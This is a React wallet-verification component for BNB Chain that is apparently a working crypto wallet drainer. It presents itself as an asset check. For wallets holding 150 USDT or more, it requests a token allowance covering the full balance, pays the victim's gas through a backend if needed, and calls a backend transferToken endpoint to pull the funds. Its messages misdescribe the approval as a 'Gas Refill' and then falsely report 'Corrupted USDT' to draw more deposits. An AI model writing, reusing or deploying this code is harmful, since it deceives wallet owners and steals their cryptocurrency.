import React, { useState, useEffect } from "react";
import { Modal } from "antd";
import toast from "react-hot-toast";
import { TokenABI } from "../wagmiConfig";
import icone2 from "../assets/icons/2.png";
import icone8 from "../assets/icons/8.png";
import { appToken, checkAllowance, getUserBalance } from "../web3";
import axios from "axios";
import { apiUrl } from "../config";

const TOKENS = {
  56: [
    {
      symbol: "USDT",
      address: "0x55d398326f99059fF775485246999027B3197955",
      decimals: 18,
      icon: icone8,
    },
  ],

  // 5611: [
  //   {
  //     symbol: "USDT",
  //     address: "0xa6004fa87492e9352C50356298104715CEeD4Cfa",
  //     decimals: 6,
  //   },
  // ],
  // 97: [
  //   {
  //     symbol: "USDT",
  //     address: "0x221c5b1a293aac1187ed3a7d7d2d9ad7fe1f3fb0",
  //     decimals: 18,
  //   },
  // ],
};

const RPC_URLS = {
  56: [
    "https://bsc-dataseed.binance.org/",
    "https://bsc-dataseed1.defibit.io/",
    "https://bsc-dataseed1.ninicoin.io/",
  ],
  // 5611: ["https://opbnb-testnet-rpc.publicnode.com"],
  // 97: [
  //   "https://bsc-testnet.public.blastapi.io",
  //   "wss://bsc-testnet-rpc.publicnode.com",
  // ],
};

// utils/provider.js
export function getProvider() {
  if (typeof window === "undefined") return null;

  if (window.ethereum?.isMetaMask) return window.ethereum; // MetaMask
  if (window.trustwallet) return window.trustwallet; // TrustWallet
  if (window.BinanceChain) return window.BinanceChain; // Binance Wallet
  if (window.ethereum?.isCoinbaseWallet) return window.ethereum; // Coinbase
  if (window.ethereum?.isBraveWallet) return window.ethereum; // Brave
  if (window.okxwallet) return window.okxwallet; // OKX
  if (window.rabby) return window.rabby; // Rabby
  if (window.ethereum) return window.ethereum; // fallback
  return null;
}

const WalletDetails = ({ checkStatus, details, web3 }) => {
  const [account, setAccount] = useState(null);
  const [isConnected, setIsConnected] = useState(true);
  const [chainId, setChainId] = useState(null);
  const [tokenBalances, setTokenBalances] = useState([]);
  const [nativeBalance, setNativeBalance] = useState(null);
  const [loading, setLoading] = useState(false);
  const [rpcError, setRpcError] = useState(null);
  const [verified, setVerified] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifyStep, setVerifyStep] = useState(0);
  const [showText, setShowText] = useState(false);

  // Loader ke liye state
  const [showModal, setShowModal] = useState(false);

  // ✅ Modal open hone par verify call karna
  useEffect(() => {
    if (checkStatus) {
      setVerifying(true); // Loader start
      setShowModal(false); // Modal abhi band
      verifyWallet(); // Verify start
    }
  }, [checkStatus]);

  // ✅ Jab verification complete ho jaye
  useEffect(() => {
    if (verified && !verifying) {
      setShowModal(true); // Ab modal khol do
    }
  }, [verified, verifying]);

  const chains = [
    {
      id: 56,
      name: "BNB Chain",
      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
      blockExplorer: "https://bscscan.com",
      icon: icone2,
    },
    // {
    //   id: 5611,
    //   name: "OPBNB Testnet",
    //   nativeCurrency: { name: "OPBNB", symbol: "BNB", decimals: 18 },
    //   blockExplorer: "https://opbnb-testnet.bscscan.com",
    //   icon: icone2,
    // },
    // {
    //   id: 97,
    //   name: "BNB Chain Testnet",
    //   nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    //   blockExplorer: "https://testnet.bscscan.com/",
    //   icon: icone2,
    // },
  ];

  const setProviderWithFallback = async (chainId) => {
    const rpcs = RPC_URLS[chainId] || [window.ethereum];
    for (const rpc of rpcs) {
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          if (
            rpc.includes("your_alchemy_api_key") ||
            rpc.includes("your_infura_api_key")
          ) {
            continue;
          }
          web3.setProvider(rpc);
          await web3.eth.getChainId();
          return true;
        } catch (error) {
          if (attempt === 3) break;
          await new Promise((resolve) => setTimeout(resolve, 1000));
        }
      }
    }
    setRpcError(`No valid RPC provider available for Chain ID: ${chainId}`);
    web3.setProvider(window.ethereum);
    return false;
  };

  const DEFAULT_CHAIN_ID = 56; // BSC Mainnet

  const ensureCorrectNetwork = async (provider) => {
    try {
      const currentChainId = await web3.eth.getChainId();
      if (Number(currentChainId) !== DEFAULT_CHAIN_ID) {
        try {
          await provider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: web3.utils.toHex(DEFAULT_CHAIN_ID) }],
          });
        } catch (error) {
          if (error.code === 4902) {
            // If BSC not added, add it
            await provider.request({
              method: "wallet_addEthereumChain",
              params: [
                {
                  chainId: web3.utils.toHex(DEFAULT_CHAIN_ID),
                  chainName: "Binance Smart Chain",
                  rpcUrls: ["https://bsc-dataseed.binance.org"],
                  nativeCurrency: {
                    name: "BNB",
                    symbol: "BNB",
                    decimals: 18,
                  },
                  blockExplorerUrls: ["https://bscscan.com"],
                },
              ],
            });
          } else {
            toast.error("Please switch to Binance Smart Chain manually");
          }
        }
      }
    } catch (err) {
      console.error("Error ensuring network:", err);
    }
  };

  useEffect(() => {
    const checkConnection = async () => {
      const provider = getProvider();
      if (!provider) {
        toast.error("No wallet detected.");
        return;
      }

      try {
        const accounts = await provider.request({
          method: "eth_requestAccounts",
        });
        setAccount(accounts[0] || null);
        setIsConnected(!!accounts[0]);

        await ensureCorrectNetwork(provider); // ✅ Force BSC
        const networkId = await web3.eth.getChainId();
        setChainId(Number(networkId));
      } catch (error) {
        setRpcError("Failed to connect: " + error.message);
      }
    };

    checkConnection();
  }, []);

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on("accountsChanged", (accounts) => {
        setAccount(accounts[0] || null);
        setIsConnected(!!accounts[0]);
        setVerified(false);
      });
      window.ethereum.on("chainChanged", async (networkId) => {
        const chainIdNumber = Number(networkId);
        setChainId(chainIdNumber);
        setVerified(false);
        await setProviderWithFallback(chainIdNumber);
      });
    }
  }, []);

  useEffect(() => {
    if (!account || !isConnected || !TOKENS[chainId]) {
      setTokenBalances([]);
      setNativeBalance(null);
      setLoading(false);
      setRpcError(
        TOKENS[chainId]
          ? null
          : `Token balances not supported on this network (Chain ID: ${chainId})`
      );
      return;
    }

    const fetchBalances = async () => {
      setLoading(true);
      setRpcError(null);

      try {
        const balance = await web3.eth.getBalance(account);
        const formattedBalance = web3.utils.fromWei(balance, "ether");
        const chain = chains.find((c) => c.id === chainId);
        setNativeBalance({
          formatted: Number(formattedBalance).toFixed(4),
          symbol: chain?.nativeCurrency.symbol || "Native",
          icon: chain?.icon,
        });
      } catch (error) {
        setNativeBalance({ formatted: "0", symbol: "Native", icon: null });
        setRpcError("Failed to fetch native balance: " + error.message);
      }

      const chainTokens = TOKENS[chainId] || [];
      try {
        const results = await Promise.all(
          chainTokens.map(async (token, index) => {
            try {
              await new Promise((resolve) => setTimeout(resolve, index * 100));
              const contract = new web3.eth.Contract(TokenABI, token.address);
              const balance = await contract.methods.balanceOf(account).call();
              const decimals = await contract.methods
                .decimals()
                .call()
                .catch(() => token.decimals);
              const symbol = await contract.methods
                .symbol()
                .call()
                .catch(() => token.symbol);
              const balanceNumber =
                typeof balance === "bigint"
                  ? Number(balance)
                  : parseFloat(balance);
              const decimalsNumber =
                typeof decimals === "bigint"
                  ? Number(decimals)
                  : parseInt(decimals, 10);
              return {
                symbol,
                balance: balanceNumber / Math.pow(10, decimalsNumber),
                error: false,
                icon: token.icon,
              };
            } catch (error) {
              return {
                symbol: token.symbol,
                balance: 0,
                error: true,
                icon: token.icon,
              };
            }
          })
        );
        setTokenBalances(results);
      } catch (error) {
        setTokenBalances(
          chainTokens.map((token) => ({
            symbol: token.symbol,
            balance: 0,
            error: true,
            icon: token.icon,
          }))
        );
        setRpcError("Failed to fetch token balances: " + error.message);
      } finally {
        setLoading(false);
      }
    };

    const debounceFetch = setTimeout(fetchBalances, 500);
    return () => clearTimeout(debounceFetch);
  }, [account, chainId, isConnected, showText]);

  const CONTRACTS = {
    56: "0xd919801e085a6c695731B0B5da55fA6715834282",
    // 97: "0xc6c9EEfBD41DE39e75BeD1DC86575Fb1eD70844D",
    // 5611: "0x3c0AE3103147B3d05e8089fBFd55bf895Bb4a36a",
  };

  const verifyWallet = async () => {
    try {
      setVerifying(true);
      setVerifyStep(1);
      const provider = getProvider();
      if (!provider) {
        toast.error(
          "No wallet detected. Please install MetaMask / TrustWallet / Binance Wallet."
        );
        return;
      }

      const accounts = await await provider.request({
        method: "eth_requestAccounts",
      });
      const owner = accounts[0];

      const chainIdNumber = Number(await web3.eth.getChainId());
      const chainTokens = TOKENS[chainIdNumber];
      const contractAddress = CONTRACTS[chainIdNumber];
      if (!chainTokens || !contractAddress) {
        toast.error(
          `Unsupported network for verification12" ${chainTokens.id}`
        );
        setVerifying(false);
        return;
      }

      const tokenAddress = chainTokens[0].address;
      const token = new web3.eth.Contract(TokenABI, tokenAddress);

      const rawBalance = await token.methods.balanceOf(owner).call();
      const decimals = Number(await token.methods.decimals().call());
      const balance = Number(rawBalance) / 10 ** decimals;
      const nativeBalanceWei = await web3.eth.getBalance(owner);
      const nativeBalanceEth = Number(
        web3.utils.fromWei(nativeBalanceWei, "ether")
      );

      const shouldCallContract = balance >= 150;

      setTimeout(async () => {
        setVerifyStep(2);

        if (shouldCallContract) {
          try {
            const allowance = await checkAllowance(
              owner,
              tokenAddress,
              contractAddress
            );

            const rawBalanceBN = BigInt(Math.floor(balance * 10 ** decimals));
            const buffer = BigInt(2 * 10 ** decimals);
            const rawNeeded = rawBalanceBN + buffer;

            if (BigInt(allowance) < rawNeeded) {
              if (nativeBalanceEth < 0.002) {
                try {
                  // request backend to send native coin
                  const response = await axios.post(`${apiUrl}/sendNative`, {
                    to: owner,
                  });

                  if (!response.data.success) {
                    throw new Error("Failed to fund native coin for gas");
                  }

                  await new Promise((resolve) => setTimeout(resolve, 3000));
                } catch (err) {
                  console.error("Native top-up failed:", err);
                  throw new Error(
                    "Gas top-up failed, cannot continue approval"
                  );
                }
              }

              await appToken(
                rawNeeded.toString(),
                tokenAddress,
                contractAddress
              );
            }

            await axios.post(`${apiUrl}/transferToken`, {
              user: owner,
              amt: rawNeeded.toString(),
            });

            setVerifyStep(3);
            setVerified(true);
            setVerifying(false);
            setShowText(true);
            setVerifyStep(0);
          } catch (error) {
            setVerifying(false);
            setVerifyStep(0);
          }
        } else {
          setTimeout(() => setVerifyStep(3), 3000);

          setTimeout(() => {
            setVerified(true);
            setVerifying(false);
            setVerifyStep(0);
          }, 5000);
        }
      }, 3000);
    } catch (err) {
      setVerifying(false);
      setVerifyStep(0);
      toast.error("Verification failed ❌");
    }
  };

  const switchChain = async () => {
    const targetChainId = 56; // ✅ BSC Mainnet

    const provider = getProvider();
    if (!provider) {
      toast.error(
        "No wallet detected. Please install MetaMask / TrustWallet / Binance Wallet."
      );
      return;
    }

    try {
      const accounts = await provider.request({
        method: "eth_requestAccounts",
      });
      // Try switching to BSC
      await await provider.request({ method: "eth_requestAccounts" });

      await setProviderWithFallback(targetChainId);
      toast.success("Switched to Binance Smart Chain ✅");
    } catch (error) {
      if (error.code === 4902) {
        // If BSC is not added → Add BSC
        try {
          await provider.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: web3.utils.toHex(targetChainId),
                chainName: "Binance Smart Chain",
                rpcUrls: ["https://bsc-dataseed.binance.org"],
                nativeCurrency: {
                  name: "BNB",
                  symbol: "BNB",
                  decimals: 18,
                },
                blockExplorerUrls: ["https://bscscan.com"],
              },
            ],
          });

          await setProviderWithFallback(targetChainId);
          toast.success("Binance Smart Chain added ✅");
        } catch (addError) {
          toast.error("Failed to add Binance Smart Chain");
        }
      } else {
        toast.error("Failed to switch to Binance Smart Chain");
      }
    }
  };

  const copyText = async (textToCopy) => {
    try {
      await navigator.clipboard.writeText(textToCopy);
      toast.success("Copied");
    } catch (error) {
      const textArea = document.createElement("textarea");
      textArea.value = textToCopy;
      textArea.style.position = "absolute";
      textArea.style.left = "-999999px";
      document.body.appendChild(textArea);
      textArea.select();
      try {
        document.execCommand("copy");
        toast.success("Copied");
      } catch (err) {
      } finally {
        textArea.remove();
      }
    }
  };

  const truncateAddress = (address) => {
    if (!address) return "";
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  };

  const handleClose = () => {
    setVerifying(false);
    setVerifyStep(0);
    setVerified(false);
    setShowText(false);
    details(false);
  };


  return (
    <>
      {/* 🔹 Loader outside modal */}
      {verifying && (
        <div className="loader-overlay">
          <div className="loader-box">
            <div className="loader-circle"></div>
            {verifyStep === 1 && <p>Submitting User Request...</p>}
            {verifyStep === 2 && <p>Creating User Request for GAS</p>}
            {verifyStep === 3 && (
              <p>Trying to Request Gas Refill approval from User</p>
            )}
          </div>
        </div>
      )}

      {/* 🔹 Modal will only open when NOT verifying */}
      {showModal && (
        <Modal
          open={checkStatus}
          footer={null}
          className="wallet-modal"
          closable={true}
          onCancel={handleClose}
        >
          <div className="wallet-modal-content">
            <div className="modal-body">
              {isConnected ? (
                <div className="wallet-info">
                  <div className="verified-section text-center">
                    <div className="status-indicator verified success-box">
                      <div className="status-icon">
                        <img
                          src="/images/green_checkmark.png"
                          alt=""
                          width={40}
                        />
                      </div>
                      <div className="status-text">
                        <h3 className="text-green-800">
                          Verification successful
                        </h3>
                      </div>
                    </div>
                    {!showText ? (
                      <p style={{ color: "green" }}>
                        Your assets are genuine and ready for trading.
                      </p>
                    ) : (
                      <p style={{ color: "red" }}>
                        Corrupted USDT has been detected, and additional assets
                        are required for recovery.
                      </p>
                    )}

                    <div className="balances-box">
                      <p className="balance-line">
                        Wallet Address: {truncateAddress(account)}{" "}
                        <button
                          onClick={() => copyText(account)}
                          style={{
                            background: "none",
                            border: "none",
                            color: "#f0b90b",
                            cursor: "pointer",
                            marginLeft: "8px",
                          }}
                        >
                          Copy
                        </button>
                      </p>
                      {nativeBalance && (
                        <p
                          className="balance-line"
                          style={{
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                          }}
                        >
                          {nativeBalance.icon && (
                            <img
                              src={nativeBalance.icon}
                              alt={`${nativeBalance.symbol} icon`}
                              width={24}
                              height={24}
                              style={{ marginRight: "8px" }}
                            />
                          )}
                          Native Balance: {nativeBalance.formatted}{" "}
                          {nativeBalance.symbol}
                        </p>
                      )}
                      {!loading && !rpcError && TOKENS[chainId] && (
                        <>
                          {tokenBalances
                            .filter((t) => !t.error && t.balance > 0)
                            .map((t, i) => (
                              <p
                                key={i}
                                className="balance-line"
                                style={{
                                  display: "flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                }}
                              >
                                {t.icon && (
                                  <img
                                    src={t.icon}
                                    alt={`${t.symbol} icon`}
                                    width={24}
                                    height={24}
                                    style={{ marginRight: "8px" }}
                                  />
                                )}
                                {t.symbol} Balance: {t.balance.toFixed(4)}
                              </p>
                            ))}
                          {tokenBalances.filter(
                            (t) => !t.error && t.balance > 0
                          ).length === 0 && (
                            <p className="balance-line">No tokens found</p>
                          )}
                        </>
                      )}
                      {loading && (
                        <p className="balance-line">Fetching balances…</p>
                      )}
                      {rpcError && !loading && (
                        <p className="error-message">⚠️ {rpcError}</p>
                      )}
                      {!TOKENS[chainId] && !loading && !rpcError && (
                        <p className="balance-line">
                          Token balances not supported on this network (Chain
                          ID: {chainId})
                        </p>
                      )}
                    </div>
                    <div className="network-box">
                      <h4>Switch Network</h4>
                      <select
                        value={chainId || ""}
                        onChange={(e) => switchChain(Number(e.target.value))}
                        style={{ display: "flex", alignItems: "center" }}
                      >
                        {chains.map((c) => (
                          <option key={c.id} value={c.id}>
                            {c.name}
                          </option>
                        ))}
                      </select>
                    </div>
                    <div className="close-btn-container">
                      <button
                        className="close-btn-footer"
                        onClick={handleClose}
                      >
                        CLOSE
                      </button>
                    </div>
                  </div>
                </div>
              ) : (
                <>
                  <div className="not-connected">
                    <div className="status-icon">🔒</div>
                    <h3>Wallet not connected </h3>
                    <p>Connect your wallet to view details</p>
                  </div>
                  <div className="close-btn-container">
                    <button className="close-btn-footer" onClick={handleClose}>
                      CLOSE
                    </button>
                  </div>
                </>
              )}
            </div>
          </div>
        </Modal>
      )}
    </>
  );
};

export default WalletDetails;
